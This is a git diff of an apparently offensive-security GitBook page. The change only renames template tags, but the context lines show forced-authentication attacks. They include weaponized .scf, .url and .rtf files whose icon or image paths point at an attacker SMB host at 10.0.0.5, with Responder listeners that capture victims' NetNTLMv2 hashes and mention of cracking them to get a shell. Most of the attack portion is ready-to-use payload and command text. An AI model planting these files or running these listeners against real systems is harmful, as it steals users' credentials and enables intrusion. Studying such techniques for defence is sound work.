@@ -14,13 +14,13 @@ Let's create a Word document that has a hyperlink to our attacking server where 
 
 Let's start `Responder` on our kali box:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```csharp
 responder -I eth1
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Once the link in the document is clicked, the target system sends an authentication request to the attacking host. Since responder is listening on the other end, victim's `NetNTLMv2` hash is captured:
 
@@ -44,8 +44,8 @@ Using the cracked passsword to get a shell on the victim system:
 
 Place the below `fa.scf` file on the attacker controlled machine at `10.0.0.7` in a shared folder `tools`
 
-{% code-tabs %}
-{% code-tabs-item title="\\\\10.0.0.7\\tools\\fa.scf" %}
+{% tabs %}
+{% tab title="\\\\10.0.0.7\\tools\\fa.scf" %}
 ```csharp
 [Shell]
 Command=2
@@ -53,8 +53,8 @@ IconFile=\\10.0.0.5\tools\nc.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 {% file src="../../.gitbook/assets/fa.scf" caption="fa.scf" %}
 
@@ -72,8 +72,8 @@ What's interesting with the `.scf` attack is that the file could easily be downl
 
 Create a weaponized .url file and upload it to the victim system:
 
-{% code-tabs %}
-{% code-tabs-item title="c:\\link.url@victim" %}
+{% tabs %}
+{% tab title="c:\\link.url@victim" %}
 ```csharp
 [InternetShortcut]
 URL=whatever
@@ -81,18 +81,18 @@ WorkingDirectory=whatever
 IconFile=\\10.0.0.5\%USERNAME%.icon
 IconIndex=1
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Create a listener on the attacking system:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```text
 responder -I eth1 -v
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Once the victim navigates to the C:\ where `link.url` file is placed, the OS tries to authenticate to the attacker's malicious SMB listener on `10.0.0.5` where NetNTLMv2 hash is captured:
 
@@ -102,23 +102,23 @@ Once the victim navigates to the C:\ where `link.url` file is placed, the OS tri
 
 Weaponizing .rtf file, which will attempt to load an image from the attacking system:
 
-{% code-tabs %}
-{% code-tabs-item title="file.rtf" %}
+{% tabs %}
+{% tab title="file.rtf" %}
 ```csharp
 {\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://10.0.0.5/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Starting authentication listener on the attacking system:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```text
 responder -I eth1 -v
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Executing the file.rtf on the victim system gives away user's hashes:
 
